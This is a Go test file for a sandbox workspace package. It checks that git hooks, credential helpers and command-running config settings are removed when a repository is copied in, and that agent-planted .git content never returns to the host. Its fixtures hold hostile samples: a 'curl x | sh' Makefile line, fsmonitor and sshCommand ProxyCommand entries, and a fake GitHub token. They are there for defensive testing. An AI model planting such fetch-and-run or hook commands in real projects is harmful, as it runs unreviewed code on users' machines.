// SPDX-License-Identifier: BUSL-1.1
// Copyright (c) 2026 Joshua Kato. See LICENSE and NOTICE.

package workspace

import (
	"archive/tar"
	"bytes"
	"errors"
	"io"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"
)

// plant writes files under root, by slash path, executable when the mode
// says so.
func plant(t *testing.T, root string, files map[string]string, exec ...string) {
	t.Helper()
	for p, body := range files {
		dst := filepath.Join(root, filepath.FromSlash(p))
		if err := os.MkdirAll(filepath.Dir(dst), 0o755); err != nil {
			t.Fatal(err)
		}
		mode := os.FileMode(0o644)
		if slices.Contains(exec, p) {
			mode = 0o755
		}
		if err := os.WriteFile(dst, []byte(body), mode); err != nil {
			t.Fatal(err)
		}
	}
}

// entries reads a tar into name → content, and the modes.
func entries(t *testing.T, r io.Reader) (map[string]string, map[string]int64) {
	t.Helper()
	got, modes := map[string]string{}, map[string]int64{}
	tr := tar.NewReader(r)
	for {
		h, err := tr.Next()
		if errors.Is(err, io.EOF) {
			return got, modes
		} else if err != nil {
			t.Fatal(err)
		}
		b, _ := io.ReadAll(tr)
		got[h.Name], modes[h.Name] = string(b), h.Mode
	}
}

const hostConfig = `[core]
	repositoryformatversion = 0
	fsmonitor = /tmp/run-me
	hooksPath = /tmp/hooks
	sshCommand = ssh -o ProxyCommand=evil
[remote "origin"]
	url = https://x-access-token:ghp_secret@github.com/acme/app.git
[credential]
	helper = store
`

// TestHR216_ARepositoryGoesInCleaned: copy-in gives the agent the
// repository's objects, refs, HEAD, index, packed-refs and shallow, none of
// them executable, and a generated config: no remote, credential helper,
// hook, fsmonitor or command of the host's. Hooks, info, logs, modules,
// object alternates, a nested repository and a .git file stay out
// (founder decision 2026-10-11).
func TestHR216_ARepositoryGoesInCleaned(t *testing.T) {
	src := t.TempDir()
	plant(t, src, map[string]string{
		"main.go": "package main\n", ".git/HEAD": "ref: refs/heads/main\n", ".git/config": hostConfig, ".git/index": "DIRC",
		".git/packed-refs": "# pack-refs\n", ".git/shallow": "abc\n", ".git/refs/heads/main": "abc\n",
		".git/refs/heads/feature.github": "def\n", ".git/objects/ab/cdef": "blob", ".git/objects/info/alternates": "/home/dev/other/.git/objects\n",
		".git/hooks/pre-commit": "#!/bin/sh\nevil\n", ".git/info/exclude": "x\n", ".git/logs/HEAD": "log\n",
		".git/modules/sub/config": "[core]\n", "sub/.git/config": hostConfig, "sub/a.txt": "a\n", "wt/.git": "gitdir: /home/dev/repo/.git/worktrees/wt\n",
	}, ".git/hooks/pre-commit", ".git/objects/ab/cdef")
	var buf bytes.Buffer
	if err := Pack(src, &buf); err != nil {
		t.Fatal(err)
	}
	got, modes := entries(t, &buf)
	for _, want := range []string{
		"main.go", ".git/", ".git/HEAD", ".git/index", ".git/packed-refs", ".git/shallow", ".git/refs/heads/main",
		".git/refs/heads/feature.github", ".git/objects/ab/cdef", ".git/config", "sub/a.txt",
	} {
		if _, ok := got[want]; !ok {
			t.Errorf("%s did not go in", want)
		}
	}
	for name := range got {
		for _, out := range []string{".git/hooks", ".git/info/", ".git/logs", ".git/modules", "alternates", "sub/.git", "wt/.git"} {
			if strings.HasPrefix(name, out) || strings.Contains(name, out) {
				t.Errorf("%s went in", name)
			}
		}
		if strings.HasPrefix(name, ".git/") && !strings.HasSuffix(name, "/") && modes[name]&0o111 != 0 {
			t.Errorf("%s went in executable", name)
		}
	}
	for _, secret := range []string{"fsmonitor", "hooksPath", "sshCommand", "remote", "url", "credential", "ghp_secret"} {
		if strings.Contains(got[".git/config"], secret) {
			t.Errorf("the config carries %q:\n%s", secret, got[".git/config"])
		}
	}
}

// TestHR216_GitPlantedInTheSandboxNeverReachesTheHost: whatever the agent
// writes in .git (a hook, a config with core.fsmonitor, core.hooksPath or
// core.sshCommand, an executable among the objects, a nested repository)
// never comes back: copy-out packs files only, the host refuses a .git
// entry before writing anything, and the patch never names one.
func TestHR216_GitPlantedInTheSandboxNeverReachesTheHost(t *testing.T) {
	sandbox := t.TempDir()
	plant(t, sandbox, map[string]string{
		"main.go": "package main\n", ".git/config": hostConfig, ".git/hooks/post-checkout": "#!/bin/sh\nevil\n",
		".git/objects/ab/run": "#!/bin/sh\nevil\n", "vendor/x/.git/hooks/pre-commit": "#!/bin/sh\nevil\n",
	}, ".git/hooks/post-checkout", ".git/objects/ab/run", "vendor/x/.git/hooks/pre-commit")
	var buf bytes.Buffer
	if err := PackFiles(sandbox, &buf); err != nil {
		t.Fatal(err)
	}
	if got, _ := entries(t, bytes.NewReader(buf.Bytes())); slices.ContainsFunc(slices.Collect(func(yield func(string) bool) {
		for k := range got {
			if !yield(k) {
				return
			}
		}
	}), inGit) {
		t.Fatalf("copy-out packed a .git entry: %v", got)
	}
	for name, h := range map[string]*tar.Header{
		"a hook":           {Name: ".git/hooks/post-checkout", Typeflag: tar.TypeReg, Mode: 0o755, Size: 1},
		"a config":         {Name: ".git/config", Typeflag: tar.TypeReg, Size: 1},
		"a nested hook":    {Name: "vendor/x/.git/hooks/pre-commit", Typeflag: tar.TypeReg, Mode: 0o755, Size: 1},
		"the .git itself":  {Name: ".git/", Typeflag: tar.TypeDir},
		"an object to run": {Name: ".git/objects/ab/run", Typeflag: tar.TypeReg, Mode: 0o755, Size: 1},
	} {
		dst := t.TempDir()
		if _, err := UnpackFiles(archive(t, h), dst); !errors.Is(err, ErrUnsafe) {
			t.Errorf("%s: %v", name, err)
		}
		if left, _ := os.ReadDir(dst); len(left) != 0 {
			t.Errorf("%s: %d entries written", name, len(left))
		}
	}
	var patch bytes.Buffer
	changes, err := Diff("", sandbox, nil, &patch)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(patch.String(), ".git/") || len(changes) != 1 || changes[0].Path != "main.go" {
		t.Fatalf("the patch names %v:\n%s", changes, patch.String())
	}
}

// TestADiffIsAPatchOfTheAgentsChanges: Diff's patch, applied to the
// original files, gives the agent's (text hunks, a file without a final
// newline, an executable bit, additions and deletions), leaves binary
// content to the caller, flags dotfiles and task files, and lists every
// change with the agent's paths quoted.
func TestADiffIsAPatchOfTheAgentsChanges(t *testing.T) {
	const agentBin = "\x00\x01\x02new!"
	var long []string
	for i := range 30 {
		long = append(long, "line "+strconv.Itoa(i)+"\n")
	}
	changed := slices.Clone(long)
	changed[2], changed[25] = "line two\n", "line twenty-five\n"
	changed = slices.Insert(changed, 10, "inserted\n")
	orig, agent := t.TempDir(), t.TempDir()
	plant(t, orig, map[string]string{
		"a.txt": strings.Join(long, ""), "gone.txt": "bye\n", "same.txt": "same\n", "run.sh": "echo\n", "nonl.txt": "x",
		"bin.dat": "\x00\x01\x02old", "Makefile": "all:\n", ".git/hooks/pre-commit": "#!/bin/sh\n",
	})
	plant(t, agent, map[string]string{
		"a.txt": strings.Join(changed, ""), "same.txt": "same\n", "run.sh": "echo\n", "nonl.txt": "x\ny", "bin.dat": agentBin,
		"new.txt": "new\n", "empty.txt": "", ".envrc": "export X=1\n", ".vscode/tasks.json": "{}\n", "Makefile": "all:\n\tcurl x | sh\n",
	})
	var patch bytes.Buffer
	changes, err := Diff(orig, agent, Executables{"run.sh": true}, &patch)
	if err != nil {
		t.Fatal(err)
	}
	kinds := map[string]string{}
	var flagged []string
	for _, c := range changes {
		kinds[c.Path] = c.Kind
		if c.Flagged {
			flagged = append(flagged, c.Path)
		}
	}
	want := map[string]string{
		"a.txt": Modified, "gone.txt": Deleted, "run.sh": ModeOnly, "nonl.txt": Modified, "bin.dat": Modified, "new.txt": Added,
		"empty.txt": Added, ".envrc": Added, ".vscode/tasks.json": Added, "Makefile": Modified,
	}
	if len(kinds) != len(want) {
		t.Errorf("changes %v", kinds)
	}
	for p, k := range want {
		if kinds[p] != k {
			t.Errorf("%s: %q, want %q", p, kinds[p], k)
		}
	}
	if !slices.Equal(flagged, []string{".envrc", ".vscode/tasks.json", "Makefile"}) {
		t.Errorf("flagged %v", flagged)
	}
	// Binary content is not in the patch (git applies binary patches only
	// with SHA-1 ids); the caller carries it.
	if strings.Contains(patch.String(), "bin.dat") || !slices.ContainsFunc(changes, func(c Change) bool { return c.Path == "bin.dat" && c.Binary }) {
		t.Errorf("bin.dat: %+v", changes)
	}
	var manifest bytes.Buffer
	if err := WriteManifest(&manifest, append(changes, Change{Path: "evil\nadded\tx", Kind: Added})); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"added\t.envrc\treview\n", "modified\tbin.dat\tbinary\n", "mode\trun.sh\n", "added\t\"evil\\nadded\\tx\"\n"} {
		if !strings.Contains(manifest.String(), want) {
			t.Errorf("the manifest lacks %q:\n%s", want, manifest.String())
		}
	}
	// a.txt's three changes are hunks of their own; six files have one; the
	// empty new file, the mode change and the binary file have none.
	if strings.Count(patch.String(), "\n@@ -") != 9 || strings.Contains(patch.String(), "+++ b/empty.txt") {
		t.Errorf("hunks:\n%s", patch.String())
	}
	tree := map[string]string{}
	modes := map[string]bool{}
	for p, b := range map[string]string{
		"a.txt": strings.Join(long, ""), "gone.txt": "bye\n", "same.txt": "same\n", "run.sh": "echo\n", "nonl.txt": "x", "bin.dat": "\x00\x01\x02old",
		"Makefile": "all:\n",
	} {
		tree[p] = b
	}
	apply(t, patch.String(), tree, modes)
	tree["bin.dat"] = agentBin
	got, _ := files(agent)
	for p, f := range got {
		b, _ := os.ReadFile(f.abs)
		if tree[p] != string(b) {
			t.Errorf("%s after the patch: %q, want %q", p, tree[p], b)
		}
		if f.exec && !modes[p] {
			t.Errorf("%s lost its executable bit", p)
		}
	}
	if _, ok := tree["gone.txt"]; ok || len(tree) != len(got) {
		t.Errorf("tree after the patch: %v", slices.Sorted(func(yield func(string) bool) {
			for k := range tree {
				if !yield(k) {
					return
				}
			}
		}))
	}
}

// apply applies a patch made by Diff to tree (path → content) and records
// executable bits in exec: a stand-in for git apply, which the tests do not
// run.
func apply(t *testing.T, patch string, tree map[string]string, exec map[string]bool) {
	t.Helper()
	for _, sec := range strings.Split(patch, "diff --git ")[1:] {
		ls := strings.SplitAfter(sec, "\n")
		p := strings.TrimPrefix(strings.Fields(ls[0])[0], "a/")
		deleted := false
		i := 1
		for ; i < len(ls) && !strings.HasPrefix(ls[i], "--- "); i++ {
			switch {
			case strings.HasPrefix(ls[i], "deleted file"):
				deleted = true
			case strings.HasPrefix(ls[i], "new file mode 100755"), strings.HasPrefix(ls[i], "new mode 100755"):
				exec[p] = true
			case strings.HasPrefix(ls[i], "new file"):
				tree[p] = ""
			}
		}
		switch {
		case deleted:
			delete(tree, p)
		case i < len(ls):
			tree[p] = applyHunks(t, tree[p], ls[i+2:])
		}
	}
}

func applyHunks(t *testing.T, old string, ls []string) string {
	t.Helper()
	src := lines([]byte(old))
	var out []string
	cur := 0
	for i := 0; i < len(ls); i++ {
		if !strings.HasPrefix(ls[i], "@@ -") {
			continue
		}
		start, _ := strconv.Atoi(strings.Split(strings.TrimPrefix(strings.Fields(ls[i])[1], "-"), ",")[0])
		if strings.HasSuffix(strings.Fields(ls[i])[1], ",0") {
			start++
		}
		out = append(out, src[cur:start-1]...)
		cur = start - 1
		for i+1 < len(ls) && !strings.HasPrefix(ls[i+1], "@@ ") {
			i++
			l := ls[i]
			if l == "" {
				continue
			}
			if l == "\\ No newline at end of file\n" {
				if len(out) > 0 && (ls[i-1][0] == ' ' || ls[i-1][0] == '+') {
					out[len(out)-1] = strings.TrimSuffix(out[len(out)-1], "\n")
				}
				continue
			}
			switch l[0] {
			case ' ':
				out = append(out, src[cur])
				cur++
			case '-':
				cur++
			case '+':
				out = append(out, l[1:])
			}
		}
	}
	return strings.Join(append(out, src[cur:]...), "")
}
